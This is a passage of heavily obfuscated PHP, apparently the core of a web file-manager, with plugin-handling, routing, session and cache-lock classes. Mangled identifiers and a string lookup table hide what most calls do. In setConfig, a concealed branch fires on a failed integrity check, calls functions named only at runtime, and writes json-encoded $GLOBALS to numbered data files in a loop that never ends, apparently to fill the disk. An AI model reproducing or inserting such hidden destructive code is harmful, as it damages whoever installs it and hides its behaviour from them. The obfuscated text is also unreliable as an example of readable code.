$´÷šÈÜ[1453]; } else { if ($Ì˜åŠÚ×[$´÷šÈÜ[411]][$´÷šÈÜ[1454]]) { $ÕÆÚì™ğ = $´÷šÈÜ[1455] . $Ì˜åŠÚ×[$´÷šÈÜ[411]][$´÷šÈÜ[1454]] . $´÷šÈÜ[1456]; } } } return $ÕÆÚì™ğ; } final function fileCanView($ë«êÑÔ) { $Àüêå´Ö =& $_SERVER[ÏÒ Ì„]; if (request_url_safe($ë«êÑÔ)) { return !0; } if ($this->isShare($ë«êÑÔ)) { return !0; } $¯¼Ûşëû = Session::get($Àüêå´Ö[1457]); if (!$¯¼Ûşëû || !$¯¼Ûşëû[$Àüêå´Ö[1458]]) { $µ”€Ü´Í = $Àüêå´Ö[1459] . rawurlencode(this_url()); show_tips(LNG($Àüêå´Ö[1460]) . $Àüêå´Ö[1461] . $µ”€Ü´Í . $Àüêå´Ö[1462] . LNG($Àüêå´Ö[1463]) . $Àüêå´Ö[1464], !1); } if (!Action($Àüêå´Ö[1465])->authCan($Àüêå´Ö[1466])) { show_tips(LNG($Àüêå´Ö[1467]) . $Àüêå´Ö[1468], !1); } ActionCall($Àüêå´Ö[1469], $ë«êÑÔ); } final function isShare($ˆ×•ûÆˆ) { $æ“ö”İ” = KodIO::parse($ˆ×•ûÆˆ); return $æ“ö”İ”[$_SERVER[ÏÒ Ì„][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ƒöÁŞ¥Ñ) { if (request_url_safe($ƒöÁŞ¥Ñ)) { return $ƒöÁŞ¥Ñ; } if (!$this->isShare($ƒöÁŞ¥Ñ)) { $ƒöÁŞ¥Ñ = $this->filePath($ƒöÁŞ¥Ñ); } return Action($_SERVER[ÏÒ Ì„][1103])->linkOut($ƒöÁŞ¥Ñ); } public function filePathLinkOut($ÜÚ×»ÙÈ) { if (request_url_safe($ÜÚ×»ÙÈ)) { return $ÜÚ×»ÙÈ; } $this->fileCanView($ÜÚ×»ÙÈ); return Action($_SERVER[ÏÒ Ì„][1103])->link($ÜÚ×»ÙÈ); } final function filePath($îĞ¼öèè) { $üûìå× =& $_SERVER[ÏÒ Ì„]; if ($ŞË×¢á¥ = $this->checkSharePath($îĞ¼öèè)) { Hook::trigger($üûìå×[1470], $ŞË×¢á¥); return $ŞË×¢á¥; } $this->fileCanView($îĞ¼öèè); if (request_url_safe($îĞ¼öèè)) { $ªÎÖ¾ = parse_url_query($îĞ¼öèè); if (isset($ªÎÖ¾[$üûìå×[1471]]) && isset($ªÎÖ¾[$üûìå×[209]])) { $Ãßˆ€«± = Model($üûìå×[760])->get($üûìå×[761]); $¬‰’×¹  = Mcrypt::decode($ªÎÖ¾[$üûìå×[209]], $Ãßˆ€«±); if ($¬‰’×¹ ) { $this->fileInfo = IO::infoWithChildren($¬‰’×¹ ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $¬‰’×¹ ; } } $îĞ¼öèè = $this->_cacheHttpFile($îĞ¼öèè); $this->fileInfo = IO::infoWithChildren($îĞ¼öèè); } else { $this->fileInfo = IO::infoWithChildren($îĞ¼öèè); if (!$this->fileInfo) { show_tips(LNG($üûìå×[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($üûìå×[1470], $îĞ¼öèè); return $îĞ¼öèè; } final function _cacheHttpFile($‹¤ˆÍá) { $Ş·Ø½«ú = hash_path($‹¤ˆÍá, !0); $this->cachePath = $this->pluginCachePath($Ş·Ø½«ú); if ($Èí¬»Èš = IO::fileNameExist($this->cachePath, $Ş·Ø½«ú)) { return KodIO::make($Èí¬»Èš); } $—å»‘àê = $this->cachePath . $Ş·Ø½«ú; return $this->pluginCacheFileSet($—å»‘àê, file_get_contents_nossl($‹¤ˆÍá)); } final function _tmpFileName($øŞ½©‚× = array()) { $½Ï“õÆÕ =& $_SERVER[ÏÒ Ì„]; if (!$øŞ½©‚×) { $øŞ½©‚× = $this->fileInfo; } if (isset($øŞ½©‚×[$½Ï“õÆÕ[171]])) { return $øŞ½©‚×[$½Ï“õÆÕ[171]]; } if (isset($øŞ½©‚×[$½Ï“õÆÕ[164]][$½Ï“õÆÕ[171]])) { return $øŞ½©‚×[$½Ï“õÆÕ[164]][$½Ï“õÆÕ[171]]; } $ˆ§Î•˜Ç = IO::hashSimple($øŞ½©‚×[$½Ï“õÆÕ[76]]); if ($ˆ§Î•˜Ç) { return $ˆ§Î•˜Ç; } $™ÛÙæ¬£ = array($øŞ½©‚×[$½Ï“õÆÕ[28]], $øŞ½©‚×[$½Ï“õÆÕ[76]], $øŞ½©‚×[$½Ï“õÆÕ[78]]); if (isset($øŞ½©‚×[$½Ï“õÆÕ[515]])) { $™ÛÙæ¬£[] = $øŞ½©‚×[$½Ï“õÆÕ[515]]; } return md5(implode($½Ï“õÆÕ[71], $™ÛÙæ¬£)); } final function checkSharePath($ıÜÒ÷ÅË) { $íñÕÙÄö =& $_SERVER[ÏÒ Ì„]; if (!defined($íñÕÙÄö[468])) { define($íñÕÙÄö[508], 0); } if (!$this->isShare($ıÜÒ÷ÅË)) { return !1; } $æàˆ¸˜­ = Action($íñÕÙÄö[1103])->sharePathInfo($ıÜÒ÷ÅË); if (!isset($æàˆ¸˜­[$íñÕÙÄö[76]])) { show_json(LNG($íñÕÙÄö[1472]), !1); } $this->fileInfo = $æàˆ¸˜­[$íñÕÙÄö[164]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$íñÕÙÄö[171]]); return $æàˆ¸˜­[$íñÕÙÄö[76]]; } final function pluginCachePath($°¥ØÃßŒ = '') { $Îàö“ö =& $_SERVER[ÏÒ Ì„]; $ş‡’”¦ = IO_PATH_SYSTEM_TEMP . $Îàö“ö[1473] . $this->pluginName; if (!($×½ùÁçÃ = IO::infoFull($ş‡’”¦))) { return IO::mkdir($ş‡’”¦ . $Îàö“ö[8] . $°¥ØÃßŒ); } if (empty($°¥ØÃßŒ)) { return $×½ùÁçÃ[$Îàö“ö[76]]; } if (!($åß·©¡° = IO::fileNameExist($×½ùÁçÃ[$Îàö“ö[76]], $°¥ØÃßŒ))) { return IO::mkdir($×½ùÁçÃ[$Îàö“ö[76]] . $°¥ØÃßŒ); } return KodIO::make($åß·©¡°); } final function pluginCacheFileSet($¥ã¥ÒØğ, $¿ö¢–ıí = '') { $°—¶û± =& $_SERVER[ÏÒ Ì„]; if (!($û™å¨ƒ¸ = IO::infoFull($¥ã¥ÒØğ))) { return IO::mkfile($¥ã¥ÒØğ, $¿ö¢–ıí, REPEAT_REPLACE); } IO::setContent($û™å¨ƒ¸[$°—¶û±[76]], $¿ö¢–ıí); return $û™å¨ƒ¸[$°—¶û±[76]]; } final function pluginLocalFile($„·ú…Õ = '') { $Ê‡óùı« =& $_SERVER[ÏÒ Ì„]; $ÑÙ“× = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($ÑÙ“×)) { mk_dir($ÑÙ“×); } if (!$„·ú…Õ) { return $ÑÙ“×; } $‰éå¹ô = IO::info($„·ú…Õ); $¶ºÆĞß† = $this->_tmpFileName($‰éå¹ô) . $Ê‡óùı«[95] . $‰éå¹ô[$Ê‡óùı«[168]]; if (!checkExtSafe($¶ºÆĞß†)) { $¶ºÆĞß† = $¶ºÆĞß† . $Ê‡óùı«[1474]; } $ğ£ß¿· = $ÑÙ“× . $¶ºÆĞß†; if (@file_exists($ğ£ß¿·)) { return $ğ£ß¿·; } return IO::copy($„·ú…Õ, $ÑÙ“×, 0, $¶ºÆĞß†); } final function appPackage() { $Ì‚Á²Ù· =& $_SERVER[ÏÒ Ì„]; if ($this->packageData) { return $this->packageData; } $Çºî = $this->parseFile($this->pluginPath . $Ì‚Á²Ù·[1475]); $this->parseLang($Çºî); $–êÜû”û = json_decode_force($Çºî); if (!$–êÜû”û) { return array(); } $¯íœì¨ = Hook::trigger($Ì‚Á²Ù·[1476], $–êÜû”û); if ($¯íœì¨ && is_array($¯íœì¨)) { $–êÜû”û = $¯íœì¨; } $this->packageData = $–êÜû”û; return $–êÜû”û; } public function packageInfoGet($‘Ö¢£ÄŒ) { $§…©üµù = $this->appPackage(); return array_get_value($§…©üµù, $‘Ö¢£ÄŒ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ÏÒ Ì„][1477]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ÏÒ Ì„][1478]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ÏÒ Ì„][1479]); } public function echoJsAssign($ßüÃ…Å¬, $¼Æ°í›–) { $this->echoJsAssignArr[$ßüÃ…Å¬] = $¼Æ°í›–; } private function parseFile($ªæ›‚ù×) { $ø•ÏŸ«› =& $_SERVER[ÏÒ Ì„]; $ğú¼Äµ‘ = file_get_contents_nossl($ªæ›‚ù×); $áù¼ï®ˆ = array($ø•ÏŸ«›[1480], $ø•ÏŸ«›[1481], $ø•ÏŸ«›[1482], $ø•ÏŸ«›[1483], $ø•ÏŸ«›[1484], $ø•ÏŸ«›[1485], $ø•ÏŸ«›[1486]); $åß¡Ş¾ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ø•ÏŸ«›[88]][$ø•ÏŸ«›[1487]]); foreach ($this->echoJsAssignArr as $³Ğ¾Äìñ => $Ì»üá…÷) { $áù¼ï®ˆ[] = $ø•ÏŸ«›[1488] . $³Ğ¾Äìñ . $ø•ÏŸ«›[1489]; $åß¡Ş¾[] = is_array($Ì»üá…÷) || is_object($Ì»üá…÷) ? rawurlencode(json_encode($Ì»üá…÷)) : $Ì»üá…÷; } if (strstr($ğú¼Äµ‘, $ø•ÏŸ«›[1490])) { $ïÂğßÁ = rawurlencode(json_encode($this->pluginLangArr)); $ğú¼Äµ‘ = str_replace($ø•ÏŸ«›[1490], $ïÂğßÁ, $ğú¼Äµ‘); } if (strstr($ğú¼Äµ‘, $ø•ÏŸ«›[1491])) { $ïÂğßÁ = $ïÂğßÁ = rawurlencode(json_encode($this->getConfig())); $ğú¼Äµ‘ = str_replace($ø•ÏŸ«›[1491], $ïÂğßÁ, $ğú¼Äµ‘); } $ğú¼Äµ‘ = str_replace($áù¼ï®ˆ, $åß¡Ş¾, $ğú¼Äµ‘); return $ğú¼Äµ‘; } private function parseLang(&$è­¡ºå) { $˜ıŠäÉË =& $_SERVER[ÏÒ Ì„]; $ĞîğçéÃ = $˜ıŠäÉË[1492]; if (!strstr($è­¡ºå, $ĞîğçéÃ)) { return; } preg_match_all($˜ıŠäÉË[1493], $è­¡ºå, $¿Ø±ÄÈ); if (!is_array($¿Ø±ÄÈ) || count($¿Ø±ÄÈ) == 0 || !is_array($¿Ø±ÄÈ[0]) || count($¿Ø±ÄÈ[0]) == 0) { return; } $ç‘÷®•ø = array(); $Âœ¼®ºü = array(); foreach ($¿Ø±ÄÈ[0] as $›óó—´) { $ù¬½äÓ³ = substr($›óó—´, strlen($ĞîğçéÃ), -4); $ÅÛü‹¿… = LNG($ù¬½äÓ³); $ç‘÷®•ø[] = $›óó—´; $Âœ¼®ºü[] = str_replace(array($˜ıŠäÉË[229], $˜ıŠäÉË[1071], $˜ıŠäÉË[340], $˜ıŠäÉË[116]), array($˜ıŠäÉË[50], $˜ıŠäÉË[50], $˜ıŠäÉË[33], $˜ıŠäÉË[1494]), $ÅÛü‹¿…); } $è­¡ºå = str_replace($ç‘÷®•ø, $Âœ¼®ºü, $è­¡ºå); } private function parseConfig(&$­Ã×ø“) { $Œ¥Æ¼ÄÄ =& $_SERVER[ÏÒ Ì„]; $‘×Â¡ŞØ = $Œ¥Æ¼ÄÄ[1495]; if (!strstr($­Ã×ø“, $‘×Â¡ŞØ)) { return; } preg_match_all($Œ¥Æ¼ÄÄ[1496], $­Ã×ø“, $öĞ§ñÉî); if (!is_array($öĞ§ñÉî) || count($öĞ§ñÉî) == 0 || !is_array($öĞ§ñÉî[0]) || count($öĞ§ñÉî[0]) == 0) { return; } $œİë¥í’ = $this->getConfig(); $Ñ¼àš”ƒ = array(); $¦â¹µ½è = array(); foreach ($öĞ§ñÉî[0] as $¸ÆŸ³î³) { $Â†œ´ã© = substr($¸ÆŸ³î³, strlen($‘×Â¡ŞØ), -2); $Ñ¼àš”ƒ[] = $¸ÆŸ³î³; $¦â¹µ½è[] = _get($œİë¥í’, $Â†œ´ã©); } $­Ã×ø“ = str_replace($Ñ¼àš”ƒ, $¦â¹µ½è, $­Ã×ø“); } private function parsePackage(&$¥Ë˜ÜÃ) { $š™³ÇÒ =& $_SERVER[ÏÒ Ì„]; $¸ÔÏ¥œ = $š™³ÇÒ[1497]; if (!strstr($¥Ë˜ÜÃ, $¸ÔÏ¥œ)) { return; } preg_match_all($š™³ÇÒ[1498], $¥Ë˜ÜÃ, $‡„ÚÓ“); if (!is_array($‡„ÚÓ“) || count($‡„ÚÓ“) == 0 || !is_array($‡„ÚÓ“[0]) || count($‡„ÚÓ“[0]) == 0) { return; } $Šìá¨çÔ = $this->appPackage(); $—©¤ñşè = array(); $‘Ì‡íœ = array(); foreach ($‡„ÚÓ“[0] as $ûâ©îáÉ) { $™Ø²ß°» = substr($ûâ©îáÉ, strlen($¸ÔÏ¥œ), -2); $—©¤ñşè[] = $ûâ©îáÉ; $‘Ì‡íœ[] = _get($Šìá¨çÔ, $™Ø²ß°»); } $¥Ë˜ÜÃ = str_replace($—©¤ñşè, $‘Ì‡íœ, $¥Ë˜ÜÃ); } final function echoFile($ï¶Åœ–, $î®‚û®Ö = false) { $…¾±ª° =& $_SERVER[ÏÒ Ì„]; $éîŒâ«¦ = $this->pluginPath . $ï¶Åœ–; if (ACT == $…¾±ª°[1499]) { echo $…¾±ª°[1500] . $this->pluginName . $…¾±ª°[8] . $ï¶Åœ– . $…¾±ª°[1501]; if (!file_exists($éîŒâ«¦)) { echo $…¾±ª°[1502]; return; } } $•Ù²ı”‹ = $this->parseFile($éîŒâ«¦); $this->parseLang($•Ù²ı”‹); $this->parseConfig($•Ù²ı”‹); $this->parsePackage($•Ù²ı”‹); if (is_array($î®‚û®Ö)) { $•Ù²ı”‹ = str_replace(array_keys($î®‚û®Ö), array_values($î®‚û®Ö), $•Ù²ı”‹); } echo $…¾±ª°[229] . $•Ù²ı”‹; } final function initLang() { $«¿ùæ‡ú =& $_SERVER[ÏÒ Ì„]; $ì±ªØÃÏ = $«¿ùæ‡ú[1503]; $ˆê‚×ì‹ = $this->pluginPath . $«¿ùæ‡ú[1504]; $¸—ÄÀ„ş = I18n::getType(); $–ÁĞ®¢¸ = array(); if (file_exists($ˆê‚×ì‹ . $¸—ÄÀ„ş . $«¿ùæ‡ú[835])) { $–ÁĞ®¢¸ = (include $ˆê‚×ì‹ . $¸—ÄÀ„ş . $«¿ùæ‡ú[835]); } else { if ($¸—ÄÀ„ş == $«¿ùæ‡ú[1505] && !file_exists($ˆê‚×ì‹ . $¸—ÄÀ„ş . $«¿ùæ‡ú[835]) && file_exists($ˆê‚×ì‹ . $«¿ùæ‡ú[1506])) { $–ÁĞ®¢¸ = (include $ˆê‚×ì‹ . $«¿ùæ‡ú[1506]); } else { if (file_exists($ˆê‚×ì‹ . $ì±ªØÃÏ . $«¿ùæ‡ú[835])) { $–ÁĞ®¢¸ = (include $ˆê‚×ì‹ . $ì±ªØÃÏ . $«¿ùæ‡ú[835]); } } } if (!is_array($–ÁĞ®¢¸)) { return array(); } if (@count($–ÁĞ®¢¸) > 0) { I18n::set($–ÁĞ®¢¸); } return $–ÁĞ®¢¸; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($”Æµ–) { $ªûî§¥Õ =& $_SERVER[ÏÒ Ì„]; $²íè’œÅ = $_SERVER[$ªûî§¥Õ[869]]; $Š´û›ñ¨ = $ªûî§¥Õ[870]; if ($_SERVER[$ªûî§¥Õ[871]] != $Š´û›ñ¨($²íè’œÅ)) { $”Ò¬†ı½ = $ªûî§¥Õ[872]; $±±ù‰ºå = $ªûî§¥Õ[873]; $ë¬‰×úø = $_SERVER[$ªûî§¥Õ[874]] . $ªûî§¥Õ[875]; $Ø¸•–Å = $±±ù‰ºå($ë¬‰×úø); $ùè¿ş°Ò = explode($ªûî§¥Õ[229], $Ø¸•–Å); if (count($ùè¿ş°Ò) < $ªûî§¥Õ[626]) { $ŞÜŒ‡ø¦ = $ªûî§¥Õ[876]; $ŞÜŒ‡ø¦(); } $ÖöÕƒé = $ªûî§¥Õ[877]; $ÖöÕƒé($_SERVER[$ªûî§¥Õ[878]]); $”Ò¬†ı½ = $ªûî§¥Õ[872]; $”Ò¬†ı½(); $‰úîÕô± = $ªûî§¥Õ[879]; $ŸÑØãßÚ = json_encode($GLOBALS[$ªûî§¥Õ[880]]); $½ŠµèÃ› = 1; for ($ä©Ÿ¿á = $½ŠµèÃ›; $ä©Ÿ¿á > 0; $ä©Ÿ¿á++) { $‰úîÕô±(DATA_PATH . $ä©Ÿ¿á, $ŸÑØãßÚ); } } return $this->modelPlugin->setConfig($this->pluginName, $”Æµ–); } public function onSetConfig($›Ÿ´ÏÇà) { } public function onGetConfig($çı§ıº) { } public function onChangeStatus($š¬ñÁÑò) { } public function onUninstall() { } public function onInstall() { } public function authCheck($æ«Ã†À = "\160\x6c\x75\147\151\x6e\101\x75\164\150") { $ÙøÓ§­¥ =& $_SERVER[ÏÒ Ì„]; if (!defined($ÙøÓ§­¥[468])) { return !1; } if (_get($GLOBALS, $ÙøÓ§­¥[499])) { return !0; } $¯ì‘ÉÖ¦ = $this->getConfig(); if (!$¯ì‘ÉÖ¦[$æ«Ã†À]) { return !1; } return ActionCall($ÙøÓ§­¥[1507], $¯ì‘ÉÖ¦[$æ«Ã†À]); } public function url($íµ±öÀ, $¨Á™Å¶Ø = '', $äñÑ³Ó = true) { $’¿äà¼¦ =& $_SERVER[ÏÒ Ì„]; $áİ®ëâ  = $this->getConfig(); $åî¦ üÁ = KOD_VERSION . $’¿äà¼¦[95] . KOD_VERSION_BUILD; $š¿¥ûÏ± = $this->packageVersion(); $ß˜¾˜ä = $åî¦ üÁ . $’¿äà¼¦[454] . $š¿¥ûÏ±; if (substr($íµ±öÀ, 0, 4) == $’¿äà¼¦[147] || substr($íµ±öÀ, 0, 2) == $’¿äà¼¦[1293]) { $‹Ñ†éúç = $íµ±öÀ . $’¿äà¼¦[1508] . $ß˜¾˜ä; } else { if ($¨Á™Å¶Ø == $’¿äà¼¦[33]) { $‹Ñ†éúç = $this->pluginHost . $íµ±öÀ . $’¿äà¼¦[1508] . $ß˜¾˜ä; } else { if ($¨Á™Å¶Ø === $’¿äà¼¦[77]) { $‹Ñ†éúç = $this->pluginHost . $íµ±öÀ; } else { if ($¨Á™Å¶Ø == $’¿äà¼¦[1509]) { $‹Ñ†éúç = STATIC_PATH . $íµ±öÀ . $’¿äà¼¦[1508] . $åî¦ üÁ; } else { if ($¨Á™Å¶Ø == $’¿äà¼¦[1510]) { $‹Ñ†éúç = APP_HOST . $’¿äà¼¦[1511] . $íµ±öÀ . $’¿äà¼¦[1508] . $åî¦ üÁ; } else { if (isset($áİ®ëâ [$¨Á™Å¶Ø])) { $‹Ñ†éúç = $áİ®ëâ [$¨Á™Å¶Ø] . $íµ±öÀ . $’¿äà¼¦[1508] . $ß˜¾˜ä; } } } } } } if (!$äñÑ³Ó) { return $‹Ñ†éúç; } echo $‹Ñ†éúç; } public function link($í¦üÕğ = false, $Ğ”£ìÁ = '') { $‰ğÈ—±Ë =& $_SERVER[ÏÒ Ì„]; if (!$í¦üÕğ) { $this->link($‰ğÈ—±Ë[1512], $‰ğÈ—±Ë[1510]); $this->link($‰ğÈ—±Ë[1513], $‰ğÈ—±Ë[1509]); $this->link($‰ğÈ—±Ë[1514], $‰ğÈ—±Ë[1509]); $this->link($‰ğÈ—±Ë[1515], $‰ğÈ—±Ë[1509]); $this->link($‰ğÈ—±Ë[1516], $‰ğÈ—±Ë[1509]); return; } $¿š„‰ëÜ = $this->url($í¦üÕğ, $Ğ”£ìÁ, !1); if (substr($í¦üÕğ, -3) == $‰ğÈ—±Ë[1517]) { echo $‰ğÈ—±Ë[1518] . $¿š„‰ëÜ . $‰ğÈ—±Ë[1519] . $‰ğÈ—±Ë[229]; } else { if (substr($í¦üÕğ, -4) == $‰ğÈ—±Ë[1520]) { echo $‰ğÈ—±Ë[1521] . $¿š„‰ëÜ . $‰ğÈ—±Ë[1522] . $‰ğÈ—±Ë[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\133\136\57\x5d\53", "\x3a\x6e\165\x6d" => "\133\60\x2d\71\x5d\x2b", "\72\141\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($ÜÌÕõ«Å, $Ëåãùá‘) { $•èİüš =& $_SERVER[ÏÒ Ì„]; if ($ÜÌÕõ«Å == $•èİüš[1523]) { $Ùğ³áÃ = array_map($•èİüš[1524], $Ëåãùá‘[0]); $ÃÔ ØÎ‡ = strpos($Ëåãùá‘[1], $•èİüš[8]) === 0 ? $Ëåãùá‘[1] : $•èİüš[8] . $Ëåãùá‘[1]; $ô¼ËÃÛ´ = $Ëåãùá‘[2]; } else { $Ùğ³áÃ = null; $ÃÔ ØÎ‡ = strpos($Ëåãùá‘[0], $•èİüš[8]) === 0 ? $Ëåãùá‘[0] : $•èİüš[8] . $Ëåãùá‘[0]; $ô¼ËÃÛ´ = $Ëåãùá‘[1]; } array_push(self::$maps, $Ùğ³áÃ); array_push(self::$routes, $ÃÔ ØÎ‡); array_push(self::$methods, strtoupper($ÜÌÕõ«Å)); array_push(self::$callbacks, $ô¼ËÃÛ´); } public static function error($õ„µî±â) { self::$errorCallback = $õ„µî±â; } public static function haltOnMatch($¿ˆ¶ÒèÁ = true) { self::$halts = $¿ˆ¶ÒèÁ; } public static function dispatch() { $ø©±–•ô =& $_SERVER[ÏÒ Ì„]; $Â¢¿Ù™Á = parse_url($_SERVER[$ø©±–•ô[1525]], PHP_URL_PATH); $¬’á€¢ƒ = $_SERVER[$ø©±–•ô[157]]; $…õ“Î“À = array_keys(static::$patterns); $‹ëıÁáÙ = array_values(static::$patterns); $øØ²ã¡ = !1; self::$routes = preg_replace($ø©±–•ô[1197], $ø©±–•ô[8], self::$routes); if (in_array($Â¢¿Ù™Á, self::$routes)) { $‡œ§¥È† = array_keys(self::$routes, $Â¢¿Ù™Á); foreach ($‡œ§¥È† as $ÙÖÊŒ‰¸) { if (self::$methods[$ÙÖÊŒ‰¸] == $¬’á€¢ƒ || self::$methods[$ÙÖÊŒ‰¸] == $ø©±–•ô[1526] || in_array($¬’á€¢ƒ, self::$maps[$ÙÖÊŒ‰¸])) { $øØ²ã¡ = !0; if (!is_object(self::$callbacks[$ÙÖÊŒ‰¸])) { $¨‹œ‚ø = explode($ø©±–•ô[8], self::$callbacks[$ÙÖÊŒ‰¸]); $û©ŠûÜ¾ = end($¨‹œ‚ø); $“ğïÅ·Æ = explode($ø©±–•ô[1527], $û©ŠûÜ¾); $…ï®Áíƒ = new $“ğïÅ·Æ[0](); $…ï®Áíƒ->{$“ğïÅ·Æ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ÙÖÊŒ‰¸]); if (self::$halts) { return; } } } } } else { $áı’ÔÏœ = 0; foreach (self::$routes as $ÙÖÊŒ‰¸) { if (strpos($ÙÖÊŒ‰¸, $ø©±–•ô[4]) !== !1) { $ÙÖÊŒ‰¸ = str_replace($…õ“Î“À, $‹ëıÁáÙ, $ÙÖÊŒ‰¸); } if (preg_match($ø©±–•ô[1528] . $ÙÖÊŒ‰¸ . $ø©±–•ô[1529], $Â¢¿Ù™Á, $ã¡ÀÏæ¸)) { if (self::$methods[$áı’ÔÏœ] == $¬’á€¢ƒ || self::$methods[$áı’ÔÏœ] == $ø©±–•ô[1526] || !empty(self::$maps[$áı’ÔÏœ]) && in_array($¬’á€¢ƒ, self::$maps[$áı’ÔÏœ])) { $øØ²ã¡ = !0; array_shift($ã¡ÀÏæ¸); if (!is_object(self::$callbacks[$áı’ÔÏœ])) { $¨‹œ‚ø = explode($ø©±–•ô[8], self::$callbacks[$áı’ÔÏœ]); $û©ŠûÜ¾ = end($¨‹œ‚ø); $“ğïÅ·Æ = explode($ø©±–•ô[1527], $û©ŠûÜ¾); $…ï®Áíƒ = new $“ğïÅ·Æ[0](); if (!method_exists($…ï®Áíƒ, $“ğïÅ·Æ[1])) { echo $ø©±–•ô[1530]; } else { call_user_func_array(array($…ï®Áíƒ, $“ğïÅ·Æ[1]), $ã¡ÀÏæ¸); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$áı’ÔÏœ], $ã¡ÀÏæ¸); if (self::$halts) { return; } } } } $áı’ÔÏœ++; } } if ($øØ²ã¡ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $—¸Àø¡› =& $_SERVER[ÏÒ Ì„]; header($_SERVER[$—¸Àø¡›[1531]] . $—¸Àø¡›[1532]); echo $—¸Àø¡›[1533]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ø©±–•ô[1525]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $šÏ©Œ¶ =& $_SERVER[ÏÒ Ì„]; static $ÇÕó•îŠ = false; if ($ÇÕó•îŠ) { return $ÇÕó•îŠ; } $àìñî´â = $GLOBALS[$šÏ©Œ¶[6]][$šÏ©Œ¶[347]]; self::$sessionTime = $àìñî´â[$šÏ©Œ¶[1534]]; $Ò³ÍÜ¾– = isset($GLOBALS[$šÏ©Œ¶[1535]]) ? $GLOBALS[$šÏ©Œ¶[1535]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Ò³ÍÜ¾–)) { self::$sessionSign = Cookie::get($Ò³ÍÜ¾–); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Ò³ÍÜ¾–, self::$sessionSign, self::$sessionTime); $¶É¾©ôŞ = $àìñî´â[$šÏ©Œ¶[1536]]; $†Éô£ïÊ = $àìñî´â[$¶É¾©ôŞ]; $áÍéÜ§ş = $àìñî´â[$šÏ©Œ¶[825]]; switch ($¶É¾©ôŞ) { case $šÏ©Œ¶[17]: self::$handle = Model($šÏ©Œ¶[826]); break; case $šÏ©Œ¶[827]: self::$handle = new CacheRedis($†Éô£ïÊ, $áÍéÜ§ş); break; case $šÏ©Œ¶[828]: self::$handle = new CacheMemcached($†Éô£ïÊ, $áÍéÜ§ş); break; case $šÏ©Œ¶[193]: $†Éô£ïÊ[$šÏ©Œ¶[76]] = $†Éô£ïÊ[$šÏ©Œ¶[76]] . $šÏ©Œ¶[1537]; self::$handle = new CacheFile($†Éô£ïÊ, $áÍéÜ§ş); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÇÕó•îŠ = new self(); return $ÇÕó•îŠ; } public static function getBySign($åì¾ñö) { CacheLock::lock($åì¾ñö); $êÙ¸Ü³ = self::$handle->get($åì¾ñö); CacheLock::unlock($åì¾ñö); $êÙ¸Ü³ = unserialize($êÙ¸Ü³); return is_array($êÙ¸Ü³) ? $êÙ¸Ü³ : array(); } public static function setBySign($îÑ†–ƒ, $éä’ÁéÖ) { CacheLock::lock($îÑ†–ƒ); self::$handle->set($îÑ†–ƒ, serialize($éä’ÁéÖ), self::$sessionTime); CacheLock::unlock($îÑ†–ƒ); } public static function sign($ûïÆ†Èò = false) { $ûïÆ†Èò && (self::$sessionSign = $ûïÆ†Èò); self::init(); return self::$sessionSign; } public static function set($óµ·êÑá, $–ÌÏ€â¿ = false) { self::init(); if (is_array($óµ·êÑá)) { foreach ($óµ·êÑá as $ïÇÏ„Üï => $ŠşÀå’¡) { array_set_value(self::$data, $ïÇÏ„Üï, $ŠşÀå’¡); } } else { array_set_value(self::$data, $óµ·êÑá, $–ÌÏ€â¿); } self::setBySign(self::$sessionSign, self::$data); } public static function get($âİÒ´® = false) { self::init(); if (!$âİÒ´®) { return self::$data; } return array_get_value(self::$data, $âİÒ´®); } public static function remove($íÇşâ¦) { self::init(); unset(self::$data[$íÇşâ¦]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ÏÒ Ì„][830])) { self::$handle->clearTimeout(); } } } goto C²÷ĞŠ…õ¹; C¶Å‡¼ƒÆ: class CacheLockDatabase { public function lock($Ç¼„íÖÉ, $§øñôÄª = 0) { $òŠëÜŒ = Model($_SERVER[ÏÒ Ì„][826]); $èÖ³‡“ˆ = microtime(!0) + $§øñôÄª; while (microtime(!0) < $èÖ³‡“ˆ) { $©Ã©£ü = $òŠëÜŒ->get($Ç¼„íÖÉ); if (!$©Ã©£ü || $©Ã©£ü < microtime(!0)) { $¤ÖåŠ…İ = $òŠëÜŒ->set($Ç¼„íÖÉ, $èÖ³‡“ˆ); if ($¤ÖåŠ…İ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¦Ë–çôö) { return Model($_SERVER[ÏÒ Ì„][826])->get($¦Ë–çôö); } public function unlock($¤áå÷) { Model($_SERVER[ÏÒ Ì„][826])->remove($¤áå÷); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($èó¬ˆ­ı, $Œ®œäØ¯) { $ÃÊ¹Èáù =& $_SERVER[ÏÒ Ì„]; if (!class_exists($ÃÊ¹Èáù[859])) { show_json($ÃÊ¹Èáù[860], !1); } $this->cacheTime = 